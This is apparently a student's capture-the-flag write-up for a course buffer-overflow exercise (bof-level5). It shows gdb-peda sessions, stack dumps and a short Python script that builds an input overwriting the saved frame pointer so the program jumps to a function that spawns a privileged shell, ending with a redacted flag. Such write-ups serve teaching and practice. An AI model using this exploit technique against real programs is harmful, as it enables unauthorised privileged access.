----------------
 bof-level5_
----------------
1.Based on tutorial of level 5, input this FOUR commands to make sure
where is the buffer stared!
 - gdb-peda$ disas receive_input
 - gdb-peda$ b *receive_input+32
 -gdb-peda$ r
 - gdb-peda$ x/x $ebp-0x80
I have ___0xffffd4a8:	0x34333231


2.then using info function command find get_a_shell
0x0804850b  get_a_shell


3.then make python code:
----- SCRIPT STARTS -----
#!/usr/bin/env python

with open('input.txt','wb') as f:
    f.write("xxxx" + "\x0b\x85\x04\x08" + "aaaa" * (128/4 - 2) + "\xa8\xd4\xff\xff")
----- SCRIPT ENDS -----

4.then run python, used command xxd input.txt
5.

nintyfour@blue9057-vm-ctf1 : ~/week2/bof-level5
$ (cat input.txt; cat) | ./bof-level5 
Now we have a buffer overflow vulnerability,
hbut the vulnerability cannot reach to the return address...
Can you exploit this program?

Segmentation fault (core dumped)

6.
nintyfour@blue9057-vm-ctf1 : ~/week2/bof-level5
$ gdb --core=core
[New LWP 17613]

warning: Unexpected size of section `.reg-xstate/17613' in core file.
Core was generated by `./bof-level5'.
Program terminated with signal SIGSEGV, Segmentation fault.

warning: Unexpected size of section `.reg-xstate/17613' in core file.
#0  0x61616161 in ?? ()

7.
gdb-peda$ x/100xw $esp-0x100
0xffffd3b0:	0xf7fe2a70	0x080481dc	0x00000001	0xf7ffd918
0xffffd3c0:	0x0804a00c	0xf7fe78a2	0xf7ffdad0	0xf7fd34a0
0xffffd3d0:	0x00000001	0x00000001	0x00000000	0xf7e6b0b1
0xffffd3e0:	0x00000001	0x0804b008	0x0000001e	0x08048295
0xffffd3f0:	0xf7ffd000	0x0804826c	0xf7e0edc8	0xf7fb4d60
0xffffd400:	0x0000000a	0xf7e09b08	0xffffd4c8	0xf7e6a3e4
0xffffd410:	0xf7fe77eb	0x00000000	0xf7fb4000	0xf7fb4000
0xffffd420:	0xffffd4d8	0xf7fee010	0xffffd4d8	0x00000084
0xffffd430:	0xffffd458	0xf7ed7b23	0x00000000	0x08048574
0xffffd440:	0x00000000	0xffffd458	0x00000084	0xf7e6c47b
0xffffd450:	0xf7fb4d60	0x0804b008	0x78787878	0x0804850b<-here is our buffer! 0x78787878!!!
0xffffd460:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd470:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd480:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd490:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd4a0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd4b0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd4c0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd4d0:	0x61616161	0x61616161	0xffffd4a8	0x080485b5
0xffffd4e0:	0x00000001	0xffffd5a4	0xffffd4f8	0x080485ce
0xffffd4f0:	0xf7fb43dc	0xffffd510	0x00000000	0xf7e1a637
0xffffd500:	0xf7fb4000	0xf7fb4000	0x00000000	0xf7e1a637
0xffffd510:	0x00000001	0xffffd5a4	0xffffd5ac	0x00000000
0xffffd520:	0x00000000	0x00000000	0xf7fb4000	0xf7ffdc04
0xffffd530:	0xf7ffd000	0x00000000	0xf7fb4000	0xf7fb4000
gdb-peda$ q


nintyfour@blue9057-vm-ctf1 : ~/week2/bof-level5
$ (cat input.txt; cat) | ./bof-level5 
Now we have a buffer overflow vulnerability,
hbut the vulnerability cannot reach to the return address...
Can you exploit this program?
Spawning a privileged shell

8.
cat flag
cs519{XXXXXXXXXXXXXXXXXX}
